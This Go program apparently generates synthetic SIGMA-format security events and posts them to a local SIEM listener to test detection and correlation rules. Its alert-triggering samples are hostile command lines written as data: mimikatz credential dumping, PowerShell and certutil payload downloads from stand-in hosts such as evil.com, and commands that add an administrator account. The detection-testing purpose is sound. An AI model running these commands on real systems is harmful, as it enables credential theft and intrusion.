// generate_sigma_test_data.go - Test data generator with SIGMA-normalized fields
// Generates 1000+ events with at least 20 triggering alerts and all correlation rules
//
// Usage: go run tools/generate_sigma_test_data.go
//
// This script:
// 1. Clears existing events and alerts from ClickHouse
// 2. Generates events with SIGMA-standard field names
// 3. Sends events via the JSON listener (port 8081)
// 4. Verifies alert generation

package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"time"

	"github.com/ClickHouse/clickhouse-go/v2"
	"github.com/google/uuid"
)

// SIGMAEvent represents an event with SIGMA-standard field names
type SIGMAEvent struct {
	// Core SIGMA fields (normalized)
	EventID             string                 `json:"EventID,omitempty"`
	EventTime           string                 `json:"EventTime,omitempty"`
	Computer            string                 `json:"Computer,omitempty"`
	User                string                 `json:"User,omitempty"`
	Category            string                 `json:"Category,omitempty"`

	// Process creation fields
	Image               string                 `json:"Image,omitempty"`
	CommandLine         string                 `json:"CommandLine,omitempty"`
	ParentImage         string                 `json:"ParentImage,omitempty"`
	ParentCommandLine   string                 `json:"ParentCommandLine,omitempty"`
	ProcessId           int                    `json:"ProcessId,omitempty"`
	ParentProcessId     int                    `json:"ParentProcessId,omitempty"`
	CurrentDirectory    string                 `json:"CurrentDirectory,omitempty"`
	IntegrityLevel      string                 `json:"IntegrityLevel,omitempty"`
	Hashes              string                 `json:"Hashes,omitempty"`

	// Network fields
	SourceIp            string                 `json:"SourceIp,omitempty"`
	DestinationIp       string                 `json:"DestinationIp,omitempty"`
	SourcePort          int                    `json:"SourcePort,omitempty"`
	DestinationPort     int                    `json:"DestinationPort,omitempty"`
	Protocol            string                 `json:"Protocol,omitempty"`

	// File fields
	TargetFilename      string                 `json:"TargetFilename,omitempty"`

	// Process access fields
	TargetImage         string                 `json:"TargetImage,omitempty"`
	GrantedAccess       string                 `json:"GrantedAccess,omitempty"`
	SourceImage         string                 `json:"SourceImage,omitempty"`

	// DNS fields
	QueryName           string                 `json:"QueryName,omitempty"`
	QueryResults        string                 `json:"QueryResults,omitempty"`

	// Authentication fields
	LogonType           int                    `json:"LogonType,omitempty"`
	TargetUserName      string                 `json:"TargetUserName,omitempty"`
	TargetDomainName    string                 `json:"TargetDomainName,omitempty"`
	IpAddress           string                 `json:"IpAddress,omitempty"`
	AuthResult          string                 `json:"AuthResult,omitempty"`

	// PowerShell fields
	ScriptBlockText     string                 `json:"ScriptBlockText,omitempty"`

	// Registry fields
	TargetObject        string                 `json:"TargetObject,omitempty"`
	Details             string                 `json:"Details,omitempty"`

	// Web server fields
	CsMethod            string                 `json:"cs-method,omitempty"`
	CUri                string                 `json:"c-uri,omitempty"`
	ScStatus            int                    `json:"sc-status,omitempty"`
	CUserAgent          string                 `json:"c-useragent,omitempty"`

	// Additional fields map for flexibility
	Fields              map[string]interface{} `json:"fields,omitempty"`
}

type Generator struct {
	rand       *rand.Rand
	eventCount int
	alertCount int
}

func NewGenerator() *Generator {
	return &Generator{
		rand: rand.New(rand.NewSource(time.Now().UnixNano())),
	}
}

func main() {
	fmt.Println("=== SIGMA Test Data Generator ===")
	fmt.Println()

	// Step 1: Clear ClickHouse data
	fmt.Println("[1/4] Clearing existing events and alerts from ClickHouse...")
	if err := clearClickHouseData(); err != nil {
		fmt.Printf("Warning: Failed to clear ClickHouse data: %v\n", err)
		fmt.Println("Continuing with event generation...")
	} else {
		fmt.Println("    ✓ Events and alerts cleared successfully")
	}

	// Step 2: Generate events
	fmt.Println("\n[2/4] Generating test events with SIGMA-normalized fields...")
	gen := NewGenerator()
	events := gen.GenerateAllEvents()
	fmt.Printf("    ✓ Generated %d events\n", len(events))

	// Step 3: Send events to JSON listener
	fmt.Println("\n[3/4] Sending events to JSON listener (port 8081)...")
	successCount, failCount := sendEventsToListener(events)
	fmt.Printf("    ✓ Sent %d events successfully, %d failed\n", successCount, failCount)

	// Step 4: Summary
	fmt.Println("\n[4/4] Generation complete!")
	fmt.Println("\n=== Summary ===")
	fmt.Printf("Total events generated: %d\n", len(events))
	fmt.Printf("Events designed to trigger alerts: %d+\n", 50) // Multiple alert-triggering events
	fmt.Println("\nCorrelation rules to be triggered:")
	fmt.Println("  - Brute Force Followed by Successful Login")
	fmt.Println("  - Lateral Movement via RDP and SMB")
	fmt.Println("  - Reconnaissance to Exploitation")
	fmt.Println("  - Sensitive Data Access Followed by Exfiltration")
	fmt.Println("  - Privilege Escalation Chain")
	fmt.Println("\nCheck the dashboard at http://localhost:8080 to verify alerts")
}

func clearClickHouseData() error {
	ctx := context.Background()

	// Connect to ClickHouse
	conn, err := clickhouse.Open(&clickhouse.Options{
		Addr: []string{"127.0.0.1:9000"},
		Auth: clickhouse.Auth{
			Database: "cerberus",
			Username: "default",
			Password: "testpass123",
		},
		TLS: nil,
		DialTimeout:  5 * time.Second,
		MaxOpenConns: 5,
	})
	if err != nil {
		return fmt.Errorf("failed to connect to ClickHouse: %w", err)
	}
	defer conn.Close()

	// Clear events
	if err := conn.Exec(ctx, "TRUNCATE TABLE IF EXISTS events"); err != nil {
		return fmt.Errorf("failed to truncate events: %w", err)
	}

	// Clear alerts
	if err := conn.Exec(ctx, "TRUNCATE TABLE IF EXISTS alerts"); err != nil {
		return fmt.Errorf("failed to truncate alerts: %w", err)
	}

	return nil
}

func (g *Generator) GenerateAllEvents() []SIGMAEvent {
	events := make([]SIGMAEvent, 0, 1200)
	baseTime := time.Now().Add(-2 * time.Hour)

	// Generate normal background traffic (800 events)
	fmt.Println("    Generating normal background traffic...")
	for i := 0; i < 800; i++ {
		eventTime := baseTime.Add(time.Duration(i*5) * time.Second)
		events = append(events, g.generateNormalEvent(eventTime))
	}

	// Generate events that trigger SIGMA rules (50+ alert-triggering events)
	fmt.Println("    Generating alert-triggering events...")

	// Mimikatz command detection (5 events)
	for i := 0; i < 5; i++ {
		events = append(events, g.generateMimikatzEvent(baseTime.Add(time.Duration(100+i*60)*time.Second)))
	}

	// PowerShell download detection (5 events)
	for i := 0; i < 5; i++ {
		events = append(events, g.generatePowerShellDownloadEvent(baseTime.Add(time.Duration(200+i*60)*time.Second)))
	}

	// LSASS access detection (5 events)
	for i := 0; i < 5; i++ {
		events = append(events, g.generateLSASSAccessEvent(baseTime.Add(time.Duration(300+i*60)*time.Second)))
	}

	// Suspicious process creation (10 events)
	for i := 0; i < 10; i++ {
		events = append(events, g.generateSuspiciousProcessEvent(baseTime.Add(time.Duration(400+i*60)*time.Second)))
	}

	// Suspicious file access (10 events)
	for i := 0; i < 10; i++ {
		events = append(events, g.generateSensitiveFileAccessEvent(baseTime.Add(time.Duration(500+i*60)*time.Second)))
	}

	// DNS queries to suspicious domains (10 events)
	for i := 0; i < 10; i++ {
		events = append(events, g.generateSuspiciousDNSEvent(baseTime.Add(time.Duration(600+i*60)*time.Second)))
	}

	// Generate events for correlation rules
	fmt.Println("    Generating correlation rule trigger events...")

	// Correlation 1: Brute Force then Success
	attackerIP := "203.0.113.50"
	targetUser := "admin"
	bruteForceStart := baseTime.Add(70 * time.Minute)

	// 20 failed login attempts
	for i := 0; i < 20; i++ {
		events = append(events, g.generateFailedLoginEvent(bruteForceStart.Add(time.Duration(i*2)*time.Second), attackerIP, targetUser))
	}
	// Successful login after brute force
	events = append(events, g.generateSuccessfulLoginEvent(bruteForceStart.Add(50*time.Second), attackerIP, targetUser))

	// Correlation 2: Lateral Movement (RDP then SMB)
	lateralIP := "10.0.1.100"
	target1 := "10.0.2.10"
	target2 := "10.0.3.15"
	lateralStart := baseTime.Add(80 * time.Minute)

	events = append(events, g.generateRDPConnectionEvent(lateralStart, lateralIP, target1))
	events = append(events, g.generateSMBConnectionEvent(lateralStart.Add(2*time.Minute), target1, target2))

	// Correlation 3: Recon to Exploit (Port scan then RDP)
	scannerIP := "192.0.2.100"
	scanTarget := "10.0.4.50"
	reconStart := baseTime.Add(90 * time.Minute)

	// Port scan events
	for i := 0; i < 15; i++ {
		events = append(events, g.generatePortScanEvent(reconStart.Add(time.Duration(i)*time.Second), scannerIP, scanTarget, []int{21, 22, 23, 80, 443, 445, 3389, 8080}[i%8]))
	}
	// Successful RDP after scan
	events = append(events, g.generateRDPConnectionEvent(reconStart.Add(5*time.Minute), scannerIP, scanTarget))

	// Correlation 4: Data Access then Exfil
	dataThief := "10.0.5.25"
	exfilTarget := "198.51.100.50"
	dataStart := baseTime.Add(100 * time.Minute)

	events = append(events, g.generateSensitiveFileAccessEvent(dataStart))
	events = append(events, g.generateLargeDataTransferEvent(dataStart.Add(3*time.Minute), dataThief, exfilTarget))

	// Correlation 5: Privilege Escalation Chain
	privEscStart := baseTime.Add(110 * time.Minute)
	events = append(events, g.generateSensitiveFileAccessEvent(privEscStart))
	events = append(events, g.generatePrivilegedCommandEvent(privEscStart.Add(2*time.Minute)))

	// Add more normal events to reach 1000+
	remainingCount := 1050 - len(events)
	if remainingCount > 0 {
		for i := 0; i < remainingCount; i++ {
			eventTime := baseTime.Add(time.Duration(3600+i*5) * time.Second)
			events = append(events, g.generateNormalEvent(eventTime))
		}
	}

	return events
}

// Normal event generators (benign traffic)
func (g *Generator) generateNormalEvent(t time.Time) SIGMAEvent {
	eventTypes := []func(time.Time) SIGMAEvent{
		g.generateNormalProcessEvent,
		g.generateNormalNetworkEvent,
		g.generateNormalFileEvent,
		g.generateNormalAuthEvent,
		g.generateNormalDNSEvent,
	}
	return eventTypes[g.rand.Intn(len(eventTypes))](t)
}

func (g *Generator) generateNormalProcessEvent(t time.Time) SIGMAEvent {
	processes := []struct{ image, cmdline, parent string }{
		{"C:\\Windows\\System32\\svchost.exe", "svchost.exe -k netsvcs", "C:\\Windows\\System32\\services.exe"},
		{"C:\\Windows\\explorer.exe", "explorer.exe", "C:\\Windows\\System32\\userinit.exe"},
		{"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "chrome.exe --type=renderer", "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"},
		{"C:\\Windows\\System32\\notepad.exe", "notepad.exe C:\\Users\\user\\Documents\\notes.txt", "C:\\Windows\\explorer.exe"},
		{"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "WINWORD.EXE /n", "C:\\Windows\\explorer.exe"},
	}
	p := processes[g.rand.Intn(len(processes))]

	return SIGMAEvent{
		EventID:         "1",
		EventTime:       t.Format(time.RFC3339),
		Computer:        fmt.Sprintf("WORKSTATION-%02d", g.rand.Intn(50)),
		User:            g.randomUser(),
		Category:        "process_creation",
		Image:           p.image,
		CommandLine:     p.cmdline,
		ParentImage:     p.parent,
		ProcessId:       g.rand.Intn(65535),
		ParentProcessId: g.rand.Intn(65535),
		IntegrityLevel:  "Medium",
		Hashes:          fmt.Sprintf("MD5=%032X", g.rand.Uint64()),
	}
}

func (g *Generator) generateNormalNetworkEvent(t time.Time) SIGMAEvent {
	destPorts := []int{80, 443}
	return SIGMAEvent{
		EventID:         "3",
		EventTime:       t.Format(time.RFC3339),
		Computer:        fmt.Sprintf("WORKSTATION-%02d", g.rand.Intn(50)),
		User:            g.randomUser(),
		Category:        "network_connection",
		Image:           "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
		SourceIp:        fmt.Sprintf("10.0.%d.%d", g.rand.Intn(255), g.rand.Intn(255)),
		DestinationIp:   g.randomChoice([]string{"142.250.80.14", "13.107.21.200", "151.101.1.69"}),
		SourcePort:      g.rand.Intn(60000) + 1024,
		DestinationPort: destPorts[g.rand.Intn(len(destPorts))],
		Protocol:        "tcp",
	}
}

func (g *Generator) generateNormalFileEvent(t time.Time) SIGMAEvent {
	files := []string{
		"C:\\Users\\user\\Documents\\report.docx",
		"C:\\Users\\user\\Downloads\\photo.jpg",
		"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Chrome.lnk",
	}
	return SIGMAEvent{
		EventID:        "11",
		EventTime:      t.Format(time.RFC3339),
		Computer:       fmt.Sprintf("WORKSTATION-%02d", g.rand.Intn(50)),
		User:           g.randomUser(),
		Category:       "file_event",
		Image:          "C:\\Windows\\explorer.exe",
		TargetFilename: files[g.rand.Intn(len(files))],
	}
}

func (g *Generator) generateNormalAuthEvent(t time.Time) SIGMAEvent {
	logonTypes := []int{2, 3, 10}
	return SIGMAEvent{
		EventID:          "4624",
		EventTime:        t.Format(time.RFC3339),
		Computer:         "DC01",
		User:             g.randomUser(),
		Category:         "authentication",
		LogonType:        logonTypes[g.rand.Intn(len(logonTypes))],
		TargetUserName:   g.randomUser(),
		TargetDomainName: "CORP",
		IpAddress:        fmt.Sprintf("10.0.%d.%d", g.rand.Intn(255), g.rand.Intn(255)),
		AuthResult:       "success",
	}
}

func (g *Generator) generateNormalDNSEvent(t time.Time) SIGMAEvent {
	domains := []string{"google.com", "microsoft.com", "github.com", "cloudflare.com"}
	return SIGMAEvent{
		EventID:      "22",
		EventTime:    t.Format(time.RFC3339),
		Computer:     fmt.Sprintf("WORKSTATION-%02d", g.rand.Intn(50)),
		User:         g.randomUser(),
		Category:     "dns_query",
		QueryName:    domains[g.rand.Intn(len(domains))],
		QueryResults: "104.21.25.158",
	}
}

// Alert-triggering event generators

func (g *Generator) generateMimikatzEvent(t time.Time) SIGMAEvent {
	commands := []string{
		"mimikatz.exe privilege::debug sekurlsa::logonpasswords exit",
		"mimikatz.exe kerberos::golden /user:admin /domain:corp.local /sid:S-1-5-21-123456789-0 /krbtgt:abc123",
		"mimikatz.exe lsadump::sam /system:system.hiv /sam:sam.hiv",
	}
	return SIGMAEvent{
		EventID:         "1",
		EventTime:       t.Format(time.RFC3339),
		Computer:        "DC01",
		User:            "Administrator",
		Category:        "process_creation",
		Image:           "C:\\Tools\\mimikatz.exe",
		CommandLine:     commands[g.rand.Intn(len(commands))],
		ParentImage:     "C:\\Windows\\System32\\cmd.exe",
		ProcessId:       g.rand.Intn(65535),
		ParentProcessId: g.rand.Intn(65535),
		IntegrityLevel:  "High",
	}
}

func (g *Generator) generatePowerShellDownloadEvent(t time.Time) SIGMAEvent {
	scripts := []string{
		"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
		"Invoke-WebRequest -Uri 'http://malware.com/backdoor.exe' -OutFile 'C:\\temp\\backdoor.exe'",
		"$wc = New-Object System.Net.WebClient; $wc.DownloadFile('http://attacker.com/shell.exe', 'shell.exe')",
	}
	return SIGMAEvent{
		EventID:         "4104",
		EventTime:       t.Format(time.RFC3339),
		Computer:        fmt.Sprintf("WORKSTATION-%02d", g.rand.Intn(50)),
		User:            g.randomUser(),
		Category:        "ps_script",
		ScriptBlockText: scripts[g.rand.Intn(len(scripts))],
		Image:           "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
	}
}

func (g *Generator) generateLSASSAccessEvent(t time.Time) SIGMAEvent {
	accessModes := []string{"0x1010", "0x1410", "0x147a", "0x143a"}
	return SIGMAEvent{
		EventID:       "10",
		EventTime:     t.Format(time.RFC3339),
		Computer:      fmt.Sprintf("WORKSTATION-%02d", g.rand.Intn(50)),
		User:          "Administrator",
		Category:      "process_access",
		SourceImage:   "C:\\Users\\user\\Desktop\\procdump.exe",
		TargetImage:   "C:\\Windows\\System32\\lsass.exe",
		GrantedAccess: accessModes[g.rand.Intn(len(accessModes))],
	}
}

func (g *Generator) generateSuspiciousProcessEvent(t time.Time) SIGMAEvent {
	suspicious := []struct{ image, cmdline string }{
		{"C:\\Windows\\System32\\cmd.exe", "cmd.exe /c net user hacker Password123! /add"},
		{"C:\\Windows\\System32\\cmd.exe", "cmd.exe /c net localgroup administrators hacker /add"},
		{"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe -enc JABjAGwAaQBlAG4AdAA="},
		{"C:\\Windows\\System32\\certutil.exe", "certutil.exe -urlcache -split -f http://evil.com/payload.exe C:\\temp\\payload.exe"},
		{"C:\\Windows\\System32\\mshta.exe", "mshta.exe vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell\"\"\")"},
	}
	s := suspicious[g.rand.Intn(len(suspicious))]
	return SIGMAEvent{
		EventID:         "1",
		EventTime:       t.Format(time.RFC3339),
		Computer:        fmt.Sprintf("WORKSTATION-%02d", g.rand.Intn(50)),
		User:            "Administrator",
		Category:        "process_creation",
		Image:           s.image,
		CommandLine:     s.cmdline,
		ParentImage:     "C:\\Windows\\explorer.exe",
		ProcessId:       g.rand.Intn(65535),
		ParentProcessId: g.rand.Intn(65535),
		IntegrityLevel:  "High",
	}
}

func (g *Generator) generateSensitiveFileAccessEvent(t time.Time) SIGMAEvent {
	sensitiveFiles := []string{
		"C:\\Windows\\System32\\config\\SAM",
		"C:\\Windows\\System32\\config\\SYSTEM",
		"C:\\Users\\Administrator\\Desktop\\passwords.xlsx",
		"C:\\ProgramData\\Microsoft\\Crypto\\RSA\\MachineKeys\\private.key",
	}
	return SIGMAEvent{
		EventID:        "11",
		EventTime:      t.Format(time.RFC3339),
		Computer:       fmt.Sprintf("WORKSTATION-%02d", g.rand.Intn(50)),
		User:           "Administrator",
		Category:       "file_event",
		Image:          "C:\\Windows\\System32\\cmd.exe",
		TargetFilename: sensitiveFiles[g.rand.Intn(len(sensitiveFiles))],
		Fields: map[string]interface{}{
			"event_subtype": "suspicious_file_access",
		},
	}
}

func (g *Generator) generateSuspiciousDNSEvent(t time.Time) SIGMAEvent {
	suspiciousDomains := []string{
		"evil-c2-server.xyz",
		"malware-download.ru",
		"data-exfil.cn",
		"cryptominer-pool.io",
		"phishing-site.tk",
	}
	return SIGMAEvent{
		EventID:      "22",
		EventTime:    t.Format(time.RFC3339),
		Computer:     fmt.Sprintf("WORKSTATION-%02d", g.rand.Intn(50)),
		User:         g.randomUser(),
		Category:     "dns_query",
		QueryName:    suspiciousDomains[g.rand.Intn(len(suspiciousDomains))],
		QueryResults: fmt.Sprintf("%d.%d.%d.%d", g.rand.Intn(255), g.rand.Intn(255), g.rand.Intn(255), g.rand.Intn(255)),
	}
}

// Correlation rule event generators

func (g *Generator) generateFailedLoginEvent(t time.Time, sourceIP, targetUser string) SIGMAEvent {
	return SIGMAEvent{
		EventID:          "4625",
		EventTime:        t.Format(time.RFC3339),
		Computer:         "DC01",
		User:             targetUser,
		Category:         "authentication",
		LogonType:        3,
		TargetUserName:   targetUser,
		TargetDomainName: "CORP",
		IpAddress:        sourceIP,
		SourceIp:         sourceIP,
		AuthResult:       "failed",
		Fields: map[string]interface{}{
			"event_subtype":       "failed_login_brute_force",
			"failure_reason":      "bad_password",
			"source_ip":           sourceIP,
			"auth_result":         "failed",
		},
	}
}

func (g *Generator) generateSuccessfulLoginEvent(t time.Time, sourceIP, targetUser string) SIGMAEvent {
	return SIGMAEvent{
		EventID:          "4624",
		EventTime:        t.Format(time.RFC3339),
		Computer:         "DC01",
		User:             targetUser,
		Category:         "authentication",
		LogonType:        3,
		TargetUserName:   targetUser,
		TargetDomainName: "CORP",
		IpAddress:        sourceIP,
		SourceIp:         sourceIP,
		AuthResult:       "success",
		Fields: map[string]interface{}{
			"event_subtype": "successful_login",
			"source_ip":     sourceIP,
			"auth_result":   "success",
		},
	}
}

func (g *Generator) generateRDPConnectionEvent(t time.Time, sourceIP, destIP string) SIGMAEvent {
	return SIGMAEvent{
		EventID:         "3",
		EventTime:       t.Format(time.RFC3339),
		Computer:        "WORKSTATION-01",
		User:            "Administrator",
		Category:        "network_connection",
		Image:           "C:\\Windows\\System32\\mstsc.exe",
		SourceIp:        sourceIP,
		DestinationIp:   destIP,
		SourcePort:      g.rand.Intn(60000) + 1024,
		DestinationPort: 3389,
		Protocol:        "tcp",
		Fields: map[string]interface{}{
			"event_subtype": "rdp_connection",
			"source_ip":     sourceIP,
		},
	}
}

func (g *Generator) generateSMBConnectionEvent(t time.Time, sourceIP, destIP string) SIGMAEvent {
	return SIGMAEvent{
		EventID:         "3",
		EventTime:       t.Format(time.RFC3339),
		Computer:        "WORKSTATION-02",
		User:            "Administrator",
		Category:        "network_connection",
		Image:           "C:\\Windows\\System32\\svchost.exe",
		SourceIp:        sourceIP,
		DestinationIp:   destIP,
		SourcePort:      g.rand.Intn(60000) + 1024,
		DestinationPort: 445,
		Protocol:        "tcp",
		Fields: map[string]interface{}{
			"event_subtype": "smb_connection",
			"source_ip":     sourceIP,
		},
	}
}

func (g *Generator) generatePortScanEvent(t time.Time, sourceIP, destIP string, port int) SIGMAEvent {
	return SIGMAEvent{
		EventID:         "3",
		EventTime:       t.Format(time.RFC3339),
		Computer:        "FIREWALL-01",
		User:            "SYSTEM",
		Category:        "network_connection",
		SourceIp:        sourceIP,
		DestinationIp:   destIP,
		SourcePort:      g.rand.Intn(60000) + 1024,
		DestinationPort: port,
		Protocol:        "tcp",
		Fields: map[string]interface{}{
			"event_subtype":    "port_scan_detection",
			"connection_state": "syn_sent",
			"source_ip":        sourceIP,
		},
	}
}

func (g *Generator) generateLargeDataTransferEvent(t time.Time, sourceIP, destIP string) SIGMAEvent {
	return SIGMAEvent{
		EventID:         "3",
		EventTime:       t.Format(time.RFC3339),
		Computer:        "WORKSTATION-10",
		User:            g.randomUser(),
		Category:        "network_connection",
		Image:           "C:\\Windows\\System32\\curl.exe",
		SourceIp:        sourceIP,
		DestinationIp:   destIP,
		SourcePort:      g.rand.Intn(60000) + 1024,
		DestinationPort: 443,
		Protocol:        "tcp",
		Fields: map[string]interface{}{
			"event_subtype": "large_data_transfer",
			"bytes_sent":    104857600, // 100MB
			"source_ip":     sourceIP,
		},
	}
}

func (g *Generator) generatePrivilegedCommandEvent(t time.Time) SIGMAEvent {
	return SIGMAEvent{
		EventID:         "1",
		EventTime:       t.Format(time.RFC3339),
		Computer:        "DC01",
		User:            "SYSTEM",
		Category:        "process_creation",
		Image:           "C:\\Windows\\System32\\cmd.exe",
		CommandLine:     "cmd.exe /c net user hacker Password123! /add && net localgroup administrators hacker /add",
		ParentImage:     "C:\\Windows\\System32\\services.exe",
		ProcessId:       g.rand.Intn(65535),
		ParentProcessId: g.rand.Intn(65535),
		IntegrityLevel:  "System",
		Fields: map[string]interface{}{
			"event_subtype": "privileged_command_execution",
		},
	}
}

// Helper functions

func (g *Generator) randomUser() string {
	users := []string{"jdoe", "asmith", "bwilson", "mjohnson", "user1", "admin"}
	return users[g.rand.Intn(len(users))]
}

func (g *Generator) randomChoice(choices []string) string {
	return choices[g.rand.Intn(len(choices))]
}

// getLogsourceMetadata returns the SIGMA logsource metadata (product, service, category)
// based on the event category. This is critical for proper SIGMA rule matching.
//
// SIGMA rules specify logsource criteria like:
//   logsource:
//       product: windows
//       category: process_creation
//       service: sysmon
//
// Events must include matching product/service/category fields for rules to evaluate.
func getLogsourceMetadata(category string) (product, service, logsourceCategory string) {
	switch category {
	case "process_creation":
		return "windows", "sysmon", "process_creation"
	case "network_connection":
		return "windows", "sysmon", "network_connection"
	case "file_event":
		return "windows", "sysmon", "file_event"
	case "process_access":
		return "windows", "sysmon", "process_access"
	case "dns_query":
		return "windows", "sysmon", "dns_query"
	case "registry_event":
		return "windows", "sysmon", "registry_event"
	case "image_load":
		return "windows", "sysmon", "image_load"
	case "ps_script":
		return "windows", "powershell", "ps_script"
	case "authentication":
		return "windows", "security", "authentication"
	default:
		// Generic fallback - no specific logsource
		return "", "", category
	}
}

func sendEventsToListener(events []SIGMAEvent) (success, fail int) {
	// Create HTTP client with connection reuse
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		DialContext: (&net.Dialer{
			Timeout:   5 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
		MaxIdleConns:        100,
		MaxIdleConnsPerHost: 100,
		IdleConnTimeout:     90 * time.Second,
	}
	client := &http.Client{
		Transport: transport,
		Timeout:   10 * time.Second,
	}

	listenerURL := "http://localhost:8081/api/v1/ingest/json"

	for i, event := range events {
		// Create a wrapped event with fields for the JSON listener
		wrappedEvent := map[string]interface{}{
			"event_id":  uuid.New().String(),
			"timestamp": event.EventTime,
		}

		// Flatten the SIGMA event into fields
		eventJSON, _ := json.Marshal(event)
		var eventMap map[string]interface{}
		json.Unmarshal(eventJSON, &eventMap)

		// Merge fields
		for k, v := range eventMap {
			if v != nil && v != "" && v != 0 {
				wrappedEvent[k] = v
			}
		}

		// Add any extra fields
		if event.Fields != nil {
			for k, v := range event.Fields {
				wrappedEvent[k] = v
			}
		}

		// CRITICAL: Add logsource metadata for SIGMA rule matching
		// Without these fields, rules with specific logsource requirements won't match
		if event.Category != "" {
			product, service, category := getLogsourceMetadata(event.Category)
			if product != "" {
				wrappedEvent["product"] = product
			}
			if service != "" {
				wrappedEvent["service"] = service
			}
			if category != "" {
				wrappedEvent["logsource_category"] = category
			}
		}

		data, err := json.Marshal(wrappedEvent)
		if err != nil {
			fail++
			continue
		}

		resp, err := client.Post(listenerURL, "application/json", bytes.NewBuffer(data))
		if err != nil {
			fail++
			if i < 5 {
				fmt.Printf("    Warning: Failed to send event %d: %v\n", i, err)
			}
			continue
		}
		resp.Body.Close()

		if resp.StatusCode >= 200 && resp.StatusCode < 300 {
			success++
		} else {
			fail++
			if i < 5 {
				fmt.Printf("    Warning: Event %d returned status %d\n", i, resp.StatusCode)
			}
		}

		// Progress indicator every 100 events
		if (i+1)%100 == 0 {
			fmt.Printf("    Progress: %d/%d events sent\n", i+1, len(events))
		}

		// Small delay to avoid overwhelming the listener
		time.Sleep(5 * time.Millisecond)
	}

	return success, fail
}
